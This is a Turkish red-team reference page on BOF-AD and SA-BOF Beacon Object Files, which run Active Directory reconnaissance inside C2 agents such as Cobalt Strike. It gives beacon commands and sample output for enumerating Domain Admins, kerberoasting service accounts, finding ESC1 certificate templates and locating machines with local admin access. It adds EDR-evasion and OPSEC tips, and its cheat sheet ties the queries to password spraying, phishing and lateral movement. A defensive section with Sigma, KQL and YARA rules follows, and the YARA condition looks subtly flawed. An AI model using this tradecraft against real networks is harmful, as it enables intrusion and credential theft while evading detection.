# BOF-AD / SA-BOF

> **Kategori:** [17. MODERN EDR-SAFE BEACON OBJECT FILES (AD BOFS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Cobalt Strike, Havoc, Sliver ve Brute Ratel gibi modern C2 altyapılarında çalışan; `Fork & Run` veya alt süreç (child process) türetmeden doğrudan ajan bellek alanı içinde (in-process) C Win32 API'leri ile çalışan EDR-güvenli Active Directory keşif kütüphaneleri.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında keşif (enumeration) ve bilgi toplama aşaması, sızma testi operatörleri ve kırmızı takımlar için en riskli operasyonel adımdır. Geleneksel yöntemler çoğunlukla işletim sistemi yerel ikililerine (`net.exe user /domain`, `nltest /dclist`, `whoami /priv`), harici araçlara (`AdFind.exe`, `SharpHound.exe`) veya PowerShell betiklerine (`PowerView.ps1`) dayanır. Ancak modern Endpoint Detection and Response (EDR) ve XDR yazılımları bu yöntemleri agresif bir şekilde izlemektedir:
* **Alt Süreç Anomalileri:** C2 ajanının (`rundll32.exe`, `svchost.exe`) alt süreç olarak `net.exe`, `cmd.exe` veya `whoami.exe` başlatması anında yüksek öncelikli alarm üretir.
* **AMSI ve Script Block Logging:** PowerShell kullanımı Event ID 4104 (Script Block Logging) ve AMSI (Antimalware Scan Interface) bellek taramalarıyla yakalanır.
* **CLR Yükleme İmzası:** C# tabanlı araçların (SharpHound, Seatbelt) çalışabilmesi için sürece .NET Common Language Runtime (`clr.dll`, `mscoree.dll`) enjekte edilmesi EDR heuristik motorlarınca şüpheli işaretlenir.

TrustedSec (@trustedsec) ve ajpc500 tarafından öncülüğü yapılan **BOF (Beacon Object File)** mimarisi, bu savunma katmanlarını aşmak için geliştirilmiştir. **BOF-AD** ve **SA-BOF (Situational Awareness BOFs)**, C diliyle yazılmış ve `x86_64-w64-mingw32-gcc` ile henüz bağlanmamış (unlinked) birer **COFF (Common Object File Format)** nesnesi (`.o`) olarak derlenmiş hafif kod bloklarıdır. C2 ajanı bu nesneyi doğrudan kendi bellek alanına yükler, Dinamik Fonksiyon Çözümleme (Dynamic Function Resolution - DFR) ile gerekli Win32 API adreslerini (`wldap32.dll`, `netapi32.dll`, `secur32.dll`) runtime'da bağlar ve ana ajan iş parçacığı (thread) içinde çalıştırıp sonucu C2 sunucusuna iletir. Bu süreçte hiçbir alt süreç türetilmez, diske dosya yazılmaz ve CLR yüklenmez.

```
+---------------------------------------------------------------------------------------------------+
|                        FORK & RUN (KLASİK) VS IN-PROCESS BOF KARŞILAŞTIRMASI                      |
+---------------------------------------------------------------------------------------------------+

 [ KLASİK YÖNTEM: Fork & Run (Yüksek EDR Riski) ]
   C2 Beacon (PID: 4120)
       │
       ├─► CreateProcessA() / Process Injection ──────► [ Yeni Süreç: net.exe / powershell.exe ]
       │                                                         │
       │                                                         ▼
       │                                                [ EDR Tespiti! ]
       │                                                - Parent-Child Anomalisi (Sysmon Event ID 1)
       │                                                - Komut Satırı Argümanı: "net user /domain"
       │                                                - AMSI / ScriptBlock Log (Olay 4104)
       ▼
 [ MODERN YÖNTEM: BOF-AD / SA-BOF (EDR-Safe In-Process) ]
   C2 Beacon (PID: 4120 - svchost.exe kılığına girmiş)
       │
       ├─► 1. C2 Sunucusundan Derlenmiş COFF Dosyası (.o) Belleğe İndirilir
       │
       ├─► 2. Beacon Dahili COFF Yükleyicisi (Internal Relocation Engine):
       │      Dinamik Fonksiyon Çözümleme (DFR) -> wldap32.dll / netapi32.dll
       │
       ├─► 3. Mevcut İş Parçacığında (In-Thread) Doğrudan C Fonksiyonu Yürütülür
       │      (Süreç Türetilmez! Disk İzi Yok! CLR Yok!)
       │
       ├─► 4. Win32 ldap_search_s() veya NetUserGetInfo() ile Doğrudan DC'ye Sorgu
       │
       └─► 5. Beacon Output Format API (BeaconPrintf) ile Sonuç Şifreli C2 Kanalına Döner
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **Sıfır Alt Süreç (No Fork & Run)** | `CreateProcess` çağrısı yapmaz; EDR'ların üst-alt süreç hiyerarşisi izleme kurallarını tamamen atlatır. |
| **Disk İzi Yoktur (Fileless)** | İkili dosya diske kaydedilmez; C2 sunucusundan gelen baytlar doğrudan bellek içinde koşturulur. |
| **AMSI ve .NET CLR Bağımsızlığı** | Saf C kodu olduğu için AMSI denetimine girmez; `clr.dll` yüklemediğinden API kancalarına yakalanmaz. |
| **Doğrudan Win32 Ağ Çağrıları** | `net.exe` çalıştırmak yerine doğrudan Windows'un `wldap32.dll` veya `netapi32.dll` API'lerini yerel olarak çağırır. |
| **Çapraz C2 Desteği** | Cobalt Strike, Havoc C2, Sliver, Brute Ratel C4 ve Mythic tarafından evrensel olarak desteklenir. |

### Keşif Yaklaşımlarının Karşılaştırmalı Matrisi

| Kriter | Windows LOLBins (`net.exe`) | PowerView (PowerShell) | SharpHound (.NET) | BOF-AD / SA-BOF |
|:---|:---|:---|:---|:---|
| **Yürütme Yeri** | Yeni Süreç (`net.exe`) | Mevcut/Yeni PowerShell | Mevcut Süreç (CLR Şart) | **Ajan İçi (In-Process C)** |
| **Sysmon Event ID 1** | ✅ Kesin Alarm | ✅ PowerShell İmzası | ❌ Yalnızca Enjeksiyon | ❌ **Tetiklemez (0 Süreç)** |
| **AMSI / ScriptBlock** | ❌ Yok | ✅ Kritik Alarm (4104) | ❌ Yok | ❌ **Yok** |
| **Bellekte CLR İzi** | ❌ Yok | ✅ Var | ✅ Var (`mscoree.dll`) | ❌ **Yok (Saf C/Win32)** |
| **Boyut / Bellek İzi** | İşletim Sistemi İkilisi | ~500 KB Script | 1-2 MB Assembly | **~10-40 KB (Mikro COFF)** |
| **EDR Tespit Olasılığı**| **Çok Yüksek** | **Yüksek** | **Orta - Yüksek** | **Çok Düşük** |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

BOF dosyaları C2 çerçevesinde genellikle Aggressor Script (`.cna`) veya C2 komut satırı arayüzü üzerinden tetiklenir.

```text
beacon> inline-execute /yol/nesne.o [argümanlar]
```

### Kritik BOF-AD ve SA-BOF Modülleri Tablosu

| Modül / Komut Adı | Açıklama | Hedef API | Örnek Kullanım |
|:---|:---|:---|:---|
| `ldapsearch` | Süreç açmadan Win32 LDAP üzerinden etki alanı nesnelerini filtreler. | `wldap32.dll` | `ldapsearch "(adminCount=1)" sAMAccountName` |
| `whoami` | Mevcut belirteç (token) izinlerini, grupları ve SID bilgisini bellekten çeker. | `advapi32.dll` | `whoami /all` |
| `netuser` | Hedef kullanıcının etki alanı ayrıntılarını, parola yaşını ve gruplarını çeker. | `netapi32.dll` | `netuser Administrator /domain` |
| `netgroup` | Belirtilen etki alanı grubunun üyelerini listeler. | `netapi32.dll` | `netgroup "Domain Admins" /domain` |
| `adcs_enum` | Sertifika şablonlarını sorgulayarak ESC1/ESC8 zafiyetlerini in-process tespit eder. | `wldap32.dll` | `adcs_enum` |
| `kerberoast` | Servis hesapları için SPN biletlerini (TGS) in-memory isteyerek hash döker. | `secur32.dll` | `kerberoast list` |
| `trusts` | Etki alanları arasındaki güven ilişkilerini (Forest/Domain Trusts) listeler. | `dsgetdc.h` | `trusts` |
| `findLocalAdminAccess`| Mevcut kullanıcının hangi uzak bilgisayarlarda yerel yönetici olduğunu denetler. | `advapi32.dll` | `findLocalAdminAccess` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: In-Process Token ve Hak Analizi (`whoami`)
EDR tarafından izlenen `whoami.exe` sürecini başlatmadan, ajan iş parçacığı içinden doğrudan belirteç ayrıcalıkları ve grup SID'leri dökülür.

```text
beacon> whoami /priv
```

```text
[*] Running whoami BOF by @ajpc500
[+] Getting token information directly via OpenProcessToken...
User: CORP\svc_backup (S-1-5-21-392817291-192837192-38192831-1105)

Privileges Information:
----------------------
SeSecurityPrivilege            : Disabled
SeBackupPrivilege              : Enabled
SeRestorePrivilege             : Enabled
SeShutdownPrivilege            : Disabled
SeChangeNotifyPrivilege        : Enabled
SeImpersonatePrivilege         : Enabled
```

### Senaryo 2: Gizli LDAP Araması ile Domain Admins Grubunu Listeleme (`ldapsearch`)
`wldap32.dll` üzerinden doğrudan etki alanı denetleyicisine şifreli LDAP sorgusu gönderilerek Domain Admin üyeleri listelenir.

```text
beacon> ldapsearch "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" sAMAccountName,mail
```

```text
[*] Executing ldapsearch BOF...
[*] Binding to LDAP directory: ldap://DC01.corp.local
[+] Search Filter: (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))
[+] Attributes: sAMAccountName, mail
--------------------------------------------------
[+] Result 1:
    sAMAccountName: Administrator
    mail: administrator@corp.local
[+] Result 2:
    sAMAccountName: sec_admin_ali
    mail: ali.sec@corp.local
--------------------------------------------------
[*] Found 2 entries. LDAP search completed.
```

### Senaryo 3: Bellek İçi Kerberoasting ile Bilet Hasadı (`kerberoast`)
Rubeus çalıştırmadan ve alt süreç açmadan, Windows LSA alt sistemi üzerinden hedef SPN'ler için TGS-REQ gönderilir ve parola kırma hash'leri alınır.

```text
beacon> kerberoast MSSQLSvc/sql01.corp.local:1433
```

```text
[*] Running Kerberoast BOF...
[*] Requesting TGS ticket for: MSSQLSvc/sql01.corp.local:1433
[+] Successfully received ticket via InitializeSecurityContext!
Hashcat Format (Mode 13100):
$krb5tgs$23$*MSSQLSvc/sql01.corp.local:1433*$CORP.LOCAL*$mssql_svc*$c981a...$a71b4...
```

### Senaryo 4: AD CS Sertifika Zafiyetlerini Tespit Etme (`adcs_enum`)
Certify.exe veya C# araçları çalıştırmadan, LDAP üzerindeki PKI konteynerleri taranarak zafiyetli şablonlar (ESC1) bulunur.

```text
beacon> adcs_enum
```

```text
[*] Running ADCS Enumeration BOF...
[*] Connecting to CN=Configuration,DC=corp,DC=local
[*] Enterprise CAs discovered:
    CA Name: CORP-CA01
    DNS Host: ca01.corp.local
[*] Checking Certificate Templates for Misconfigurations...
[!] VULNERABLE TEMPLATE FOUND: WebServer-ClientAuth
    - Schema Version: 2
    - Client Authentication: True
    - Enrollee Supplies Subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT): TRUE (ESC1 Vulnerable!)
    - Enrollment Permissions: Authenticated Users (Read, Enroll)
```

### Senaryo 5: Etki Alanı Güven İlişkilerini Haritalandırma (`trusts`)
`nltest /domain_trusts` çağırmadan `DsEnumerateDomainTrustsW` API'si ile forest ve domain güven haritası çıkarılır.

```text
beacon> trusts
```

```text
[*] Running Trusts Enumeration BOF...
[*] Current Domain: CORP.LOCAL
Trust Partners:
--------------------------------------------------
Target Domain: DEV.CORP.LOCAL
    Trust Type: Tree Root
    Trust Direction: Bidirectional (Two-Way)
    Trust Attributes: Within Forest
Target Domain: PARTNER.EXTERNAL
    Trust Type: External
    Trust Direction: Inbound
    Trust Attributes: Non-Transitive, SID Filtering Enabled
--------------------------------------------------
[*] Trust enumeration complete.
```

### Senaryo 6: Yerel Yönetici Yetkisi Olan Makineleri Bulma (`findLocalAdminAccess`)
`netapi32.dll` içerisindeki `NetShareEnum` ve RPC kontrolleriyle mevcut kullanıcının C$ paylaşımına yazma yetkisi olduğu makineler taranır.

```text
beacon> findLocalAdminAccess
```

```text
[*] Testing local administrator rights across active domain workstations...
[+] 10.10.10.15 (SRV-APP01.corp.local)  : ADMIN ACCESS (C$ writable)
[-] 10.10.10.20 (SRV-DB01.corp.local)   : Access Denied
[+] 10.10.10.35 (WS-HR04.corp.local)    : ADMIN ACCESS (C$ writable)
[*] Scan finished. 2 machines with local administrator access discovered.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `Beacon error: Could not resolve symbol 'wldap32$ldap_init'` | C2 BOF yükleyicisi dinamik fonksiyon çözümleme (DFR) kütüphane sembolünü bulamamıştır. | Hedef işletim sisteminde `wldap32.dll` kütüphanesinin mevcut olduğunu doğrulayın; BOF kaynak kodundaki DFR tanımlamasını teyit edin. |
| `LDAP error: 0x51 (Server Down / Timeout)` | Hedef Domain Controller'ın 389/636 portuna ağ erişimi engellenmiş veya host adı çözülememiştir. | DC adresi yerine doğrudan DC IP adresini parametre olarak verin veya DNS yapılandırmasını kontrol edin. |
| `Beacon process crashed (STATUS_ACCESS_VIOLATION 0xC0000005)` | BOF içindeki C kodunda bellek sızıntısı, sınır aşımı veya ayrılmamış bir işaretçi (null pointer) başvurusu vardır. | BOF ikilisini güncel TrustedSec/ajpc500 release'inden tekrar derleyin; büyük çıktı dönen sorgularda filtreyi daraltın. |
| `LDAP error: 0x31 (Invalid Credentials / 0x4f)` | Ajanın çalıştığı Windows oturumu geçerli bir etki alanı Kerberos biletine (TGT) sahip değildir. | `klist` ile bilet varlığını denetleyin; yerel kullanıcıdaysanız `make_token` ile etki alanı kimlik bilgisi yükleyin. |
| Çıktı çok uzun olduğu için kesildi (Truncated Output) | `BeaconOutput` arabelleği dönen yüzlerce LDAP nesnesini karşılayamayacak boyuttadır. | LDAP sorgunuza sayfalama (paging) bayrakları ekleyin veya arama filtresini belirli OU/kullanıcı bazında özelleştirin. |
| `Access Denied (0x5) / ERROR_ACCESS_DENIED` | Sorgulanan Active Directory nesnesi (örneğin LAPS parolası veya GPO konteyneri) kısıtlı ACL izinlerine sahiptir. | Kullanıcının okuma haklarını denetleyin; yetkili bir etki alanı hesabı bağlamına geçtikten sonra sorguyu yineleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                              BOF-AD TESPİT VE GÖZLEMLENEBİLİRLİK ŞEMASI                           |
+---------------------------------------------------------------------------------------------------+

 [ Ajan Süreç İçi Yürütme (In-Process) ]
  - Süreç Türetimi (Fork & Run): 0 SÜREÇ      ====> Sysmon Event ID 1 TETİKLENMEZ!
  - Komut Satırı Günlüğü (Cmdline): YOK       ====> EDR Komut Satırı İzleme Körleşir!
  - Bellek Taraması: RWX / RX Bellek Sayfaları ====> Moneta / Pe-sieve Bellek Anomali Taramaları

 [ Ağ Katmanı (Domain Controller Etkileşimi) ]
  - Hedef Portlar: 389 (LDAP), 88 (Kerberos)  ====> Doğal Ağ Trafiği (İş İstasyonu -> DC)
  - Anormal Yoğunlukta LDAP Sorgusu           ====> Event ID 1644 (Active Directory LDAP İncelemesi)
  - Çok Sayıda SPN İsteği (Kerberoasting)     ====> Event ID 4769 (Kerberos Service Ticket Requested)
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sıfır Süreç İzi:** `Sysmon Event ID 1` veya `Windows Event ID 4688` üzerinde hiçbir işlem kaydı oluşmaz.
* **Active Directory Diagnostic Event ID 1644 (Expensive/Inefficient LDAP Searches):** DC üzerinde LDAP tanılama günlüğü açıksa, BOF tarafından gönderilen geniş kapsamlı `(adminCount=1)` veya `(objectClass=*)` sorguları indeksleme yükü sebebiyle loglanır.
* **Windows Security Event ID 4769 (Kerberos Ticket Operations):** In-process kerberoast çalıştırıldığında, şifreleme türü `0x17` (RC4-HMAC-MD5) olan TGS bilet istekleri DC olay günlüğünde belirir.

### 5.2 Bellek ve EDR İmzaları
* BOF'lar süreç türetmese de, C2 ajanının belleğinde çalıştırılmak üzere geçici olarak ayrılan hafıza sayfaları (Memory Pages) bellek koruma bayrakları (`PAGE_EXECUTE_READWRITE` / RWX) içeriyorsa gelişmiş EDR bellek tarayıcıları (Hunt-Sleeping-Beacons, Moneta) tarafından tespit edilebilir.
* Modern C2'lar BOF yürütülmeden önce belleği dinamik tahsis edip (`VirtualAlloc`) iş bitiminde temizleyerek (`VirtualFree`) bu izi asgariye indirir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Discovery** | `T1087.002` | Account Discovery: Domain Account | LDAP ve NetAPI Win32 çağrılarıyla süreçsiz etki alanı kullanıcısı keşfi. |
| **Discovery** | `T1069.002` | Permission Groups Discovery: Domain Groups | Domain Admins ve ayrıcalıklı grup üyelerini sorgulama. |
| **Credential Access** | `T1558.003` | Steal or Forge Kerberos Tickets: Kerberoasting | Ajan bellek alanında doğrudan SPN bilet hasadı yapma. |
| **Defense Evasion** | `T1055` | Process Injection | Ajan süreci içinde dinamik COFF bağlama ve yürütme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Geniş Kapsamlı LDAP Aramaları | **ORTA** | `(objectClass=*)` gibi genel sorgulardan kaçının; doğrudan hedef nesneyi işaret eden spesifik LDAP filtreleri kullanın. |
| Toplu Kerberoasting İstekleri | **YÜKSEK** | Tüm SPN'leri aynı anda istemeyin; istekler arasına rastgele gecikmeler (jitter) ekleyin ve şifreleme olarak AES-256 tercih edin. |
| Bellek Sayfası İmzaları (RWX) | **ORTA** | C2 yapılandırmasında sleep mask ve bellek obfuscation (Ekko / Foliage / Z揃) mekanizmalarını aktif tutun. |
| Bilinen Statik COFF İmzaları | **YÜKSEK** | GitHub release `.o` dosyalarını olduğu gibi kullanmayın; fonksiyon ve değişken adlarını karıştırarak kendi MinGW derlemenizi yapın. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (DC Üzerinde Anormal LDAP ve SPN Sorgusu):
```yaml
title: In-Process LDAP and Kerberoast Enumeration
id: 4a129ef8-1123-4c91-9a45-6f17823ab214
status: experimental
description: Detects patterns of in-process LDAP and Kerberoasting originating from anomalous workstation endpoints.
logsource:
  product: windows
  service: security
detection:
  selection_kerb:
    EventID: 4769
    TicketOptions: '0x40810000'
    TicketEncryptionType: '0x17'
  condition: selection_kerb
falsepositives:
  - Legacy applications utilizing RC4 Kerberos tickets
level: medium
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17" // RC4 Kerberoast
| where ServiceName !endswith "$"
| summarize RequestCount = count(), SPNs = make_set(ServiceName) by Computer, TargetUserName, bin(TimeGenerated, 10m)
| where RequestCount > 5
| project TimeGenerated, TargetUserName, Computer, RequestCount, SPNs
```

#### Incident Response (IR) PowerShell LDAP Trafik İzleme:
```powershell
# Etki alanı denetleyicisinde LDAP arama olaylarını filtreleme (Event ID 1644)
Get-WinEvent -FilterHashtable @{LogName='Directory Service'; Id=1644} -MaxEvents 50 | Where-Object {
    $_.Message -match "adminCount=1" -or $_.Message -match "servicePrincipalName"
} | Select-Object TimeCreated, @{N='Details';E={$_.Message}}
```

#### YARA Kuralı (COFF Nesne Dosyası Tespiti):
```yara
rule HackTool_COFF_BeaconObjectFile_Generic {
    meta:
        description = "Detects compiled COFF Object Files (.o) containing BOF-AD / SA-BOF signatures"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/trustedsec/CS-Situational-Awareness-BOF"
    strings:
        $s1 = "BeaconPrintf" ascii
        $s2 = "BeaconDataParse" ascii
        $s3 = "wldap32$ldap_search_s" ascii
        $s4 = "netapi32$NetUserGetInfo" ascii
        $s5 = "adcs_enum" ascii
    condition:
        uint16(0) == 0x014C or uint16(0) == 0x8664 and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **LDAP İmzalama ve Kanal Bağlama (LdapEnforceChannelBinding):** DC üzerinde LDAP imzalama zorunlu tutulmalı ve NTLM fallback kapatılmalıdır.
* **Gelişmiş Bellek Denetimi (EDR Behavioral Memory Scanners):** Ajanın süreç bellek alanındaki unmapped bellek sayfaları (unbacked memory) ve çağrı yığını (call stack) manipülasyonları izlenmelidir.
* **Kerberoasting Sertleştirme:** Tüm servis hesapları (SPN) en az 25 karakterden oluşan karmaşık parolalara geçirilmeli veya gMSA (Group Managed Service Accounts) kullanılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Süreç Açmadan Token ve Hak Bilgilerini Dökme
```text
whoami /all
```
* **Ne Yapar?:** Ajanın içinde çalıştığı sürecin token SID'lerini, gruplarını ve ayrıcalıklarını listeler.
* **Ne Zaman Kullanılır?:** Yeni bir oturum elde edildiğinde ilk situasyon analizi için.
* **Parametreler:** `/all` (tüm belirteç alanları).

#### 2. Domain Admins Grubunu In-Process LDAP ile Listeleme
```text
ldapsearch "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName
```
* **Ne Yapar?:** Alt süreç başlatmadan doğrudan `wldap32.dll` ile Domain Admins üyelerini çeker.
* **Ne Zaman Kullanılır?:** Etki alanındaki en yetkili kullanıcıları tespit etmek için.
* **Parametreler:** LDAP filtre dizesi ve listelenecek öznitelik (`sAMAccountName`).

#### 3. Etki Alanındaki Tüm Etkin Kullanıcıları Sorgulama
```text
ldapsearch "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName,title,department
```
* **Ne Yapar?:** Devre dışı bırakılmamış tüm kurumsal kullanıcıları unvan ve departmanlarıyla listeler.
* **Ne Zaman Kullanılır?:** Hedefli oltalama veya parola püskürtme listesi oluşturmak için.
* **Parametreler:** LDAP bitwise filtreleri.

#### 4. Tekil Bir Kullanıcının Ayrıntılarını NetAPI ile İnceleme
```text
netuser Administrator /domain
```
* **Ne Yapar?:** `net.exe` çalıştırmadan `NetUserGetInfo` API'si ile parolanın ne zaman değiştiğini ve kısıtlamaları döker.
* **Ne Zaman Kullanılır?:** Hedef kullanıcının hesap durumunu denetlemek için.
* **Parametreler:** `<kullanici_adi> /domain`.

#### 5. Sertifika Şablonu Zafiyetlerini (ESC1) Tarama
```text
adcs_enum
```
* **Ne Yapar?:** AD CS ortamındaki tüm sertifika yetkililerini ve zafiyetli şablonları in-process raporlar.
* **Ne Zaman Kullanılır?:** Active Directory sertifika hizmetleri üzerinden yetki yükseltme ararken.
* **Parametreler:** Parametresiz çalışır.

#### 6. Servis Hesapları İçin Kerberoast Bilet Hasadı
```text
kerberoast list
```
* **Ne Yapar?:** SPN tanımlı tüm hesapları listeler veya bilet isteyerek hash çıktısı üretir.
* **Ne Zaman Kullanılır?:** Çevrimdışı parola kırma ile servis hesabı ele geçirmek için.
* **Parametreler:** `list` veya `<SPN_adi>`.

#### 7. Etki Alanı Güven Ağını (Trusts) Haritalandırma
```text
trusts
```
* **Ne Yapar?:** Mevcut etki alanının bağlı olduğu tüm child, parent ve harici forest güvenlerini listeler.
* **Ne Zaman Kullanılır?:** Forest dışına veya güvenilen diğer etki alanlarına pivot hazırlığında.
* **Parametreler:** Parametresiz çağrılır.

#### 8. Yerel Yönetici Erişim Haklarını Doğrulama
```text
findLocalAdminAccess
```
* **Ne Yapar?:** Ağdaki sunucuları tarayarak mevcut kullanıcının administrative share (C$) erişimlerini raporlar.
* **Ne Zaman Kullanılır?:** Yanal hareket (lateral movement) için hedef makine seçerken.
* **Parametreler:** Parametresiz çalışır.

#### 9. Parola İlkesini (Password Policy) Görüntüleme
```text
get-domaininfo
```
* **Ne Yapar?:** Etki alanının minimum parola uzunluğunu, kilitleme eşiğini (lockout threshold) bellekten çeker.
* **Ne Zaman Kullanılır?:** Parola püskürtme öncesinde hesap kilitleme riskini hesaplamak için.
* **Parametreler:** Parametresiz çalışır.

#### 10. Etki Alanındaki DC Sunucularını Keşfetme
```text
get-domaincontroller
```
* **Ne Yapar?:** `DsGetDcName` API'si ile birincil PDC ve tüm DC sunucularının IP ve rollerini listeler.
* **Ne Zaman Kullanılır?:** Hedef etki alanı denetleyicisini tespit etmek için.
* **Parametreler:** Parametresiz çalışır.

---

## Kaynaklar

* [TrustedSec Resmi GitHub Deposu: Situational Awareness BOFs](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
* [ajpc500 Resmi GitHub Deposu: BOF-AD](https://github.com/ajpc500/BOF-AD)
* [Cobalt Strike Dokümantasyonu: Beacon Object Files (BOFs)](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm)
* [The Hacker Recipes: Beacon Object Files](https://www.thehacker.recipes/)
* [HackTricks: Beacon Object Files (BOF) Usage](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/cobalt-strike/index.html)
* [MITRE ATT&CK: Account Discovery (T1087)](https://attack.mitre.org/techniques/T1087/)

---

> **Önceki:** [← Proxychains-ng (Kategori 16)](../Kategori_16_Tunelleme_Pivot_ve_SOCKS_Proxy/Proxychains-ng.md) · **Sonraki:** [Hashcat (Kategori 18) →](../Kategori_18_Cevrimdisi_Parola_Kirma/Hashcat.md)
